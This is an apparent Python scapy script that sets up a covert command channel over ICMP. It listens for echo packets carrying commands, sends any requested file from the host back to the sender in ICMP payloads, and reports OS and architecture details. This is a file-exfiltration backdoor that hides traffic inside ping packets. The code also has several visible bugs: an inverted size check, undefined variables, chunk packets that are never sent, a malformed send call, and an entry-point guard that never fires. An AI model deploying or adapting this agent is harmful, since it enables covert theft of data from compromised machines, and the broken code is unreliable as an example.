from scapy.all import *
from time import sleep
import sys, os, platform

def clamp(inp, mini=0, maxi=1):
    # Basic clamp function - clamps intput between a minimum & maximum value (default is between 0 & 1).
    if (inp > maxi):
        return maxi
    elif (inp < mini):
        return mini
    else:
        return inp

def getInfo():
    # Returns an string containing basic information about the machine (OS, OS Version, and Architecture).
    pltfrm_Info = [str(platform.platform()), str(platform.system()), str(platform.version()), str(platform.architecture()).join("")]

    return "\\xc3\\xab".join(pltfrm_Info)

def download(payload, dst_IP):
    # Given the payload from a packet containing a 'download' command, the file's contents are read to the
    # variable 'data'. The variable 'data' is then split across the appropriate number of packets and sent to
    # the client.
    with open(str(payload[1]), "rb") as file:
        data = file.read()
        file.close()
    if(len(data) > chunk_size_limit):
        print("Sending file in one packet")
        rtrn_packet =  IP(dst=str(dst_IP))/ICMP(type=8)/(b'0\\xc3\\xab' + data)
        print(rtrn_packet)
        send(rtrn_packet)
    else:
        print("Sending file in multiple packets")
        lim = chunk_size_limit
        data_arr = [data[i:i+lim] for i in range(0, len(data), lim)]
        print(data_arr)

        init_packet = IP(dst=str(dst_IP))/ICMP(type=8)/(b'1\\xc3\\xab' + bytes(str(int((float(len(data)) / lim) + 1)).encode("utf-8")))

        print("Init packet sent with data: {}".format(str(init_packet[Raw].load)))
        send(init_packet)

        print("Waiting for confirmation, timeout is 15 seconds.")
        conf = sniff(filter="icmp and host {}".format(str(dst_IP)), timeout=15)
        confirmed = False

        for packet in conf:
            try:
                print("Details:\nPacket Src: {}\nPacket Data: {}".format(str(pkt[IP].src), str(pkt[Raw].load)))
                payload = str(pkt[Raw].load[2:1].split("\\xc3\\xab"))
                if (str(payload[0]) == "1" and int(payload[1]) == lim):
                    print("Confirmation recieved.")
                    confirmed = True
                    break
                else:
                    confirmed = False
            except:
                confirmed = False

        if (confirmed):
            for i in range(0, int((float(len(data)) / lim) + 1)):
                sleep(2)
                packet = IP(dst=str(dst_IP))/ICMP(type=8)/(data_arr[i])
        else:
            print("Packet not confirmed.")

def main():
    # Main logic for recieving requests & communicating with a client. Sets the limit for data transmitted
    # per packet, then continues to the main loop waiting for commands from a client.
    num_args = len(sys.argv)
    global chunk_size_limit
    if(num_args < 2):
        print("No arguments supplied - using defaults")
        chunk_size_limit = 1000
    else:
        try:
            chunk_size_limit = clamp(int(sys.argv[1]), 1, 1000)
        except:
            print("Chunk size must be an integer.")
            chunk_size_limit = 1000

        print("Length of chunk: {}".format(chunk_size_limit))


    while True:
        print("Waiting for packet.")
        pkts = sniff(filter="icmp", count=1)

        for pkt in pkts:
            if (str(pkt[ICMP].type == 8)):
                print("Valid packet type")
            else:
                break

            print("Determining command.")

            try:
                print("Details:\nPacket Src: {}\nPacket Data: {}".format(str(pkt[IP].src), str(pkt[Raw].load)))
                payload = str(pkt[Raw].load)[2:-1].split("\\xc3\\xab")
                command = payload[0]
                if (command == "download" and len(payload) == 2):
                    print("Checking for file.")
                    if (os.path.isfile(str(payload[1]))):        
                        print("Downloading file {}".format(payload[1]))
                        download(payload, str(pkt[IP].src)) 
                    else:
                        print("File '{}' does not exist.".format(payload[1]))
                        break
                elif (command == "info"):
                    sys_Info = getInfo()

                    send(dst=str(pkt[IP].src)/ICMP(type=8)/(bytes(sys_Info.encode("UTF-8"))))
            except:
                print("Invalid payload")

if __name__ == "main":
    main()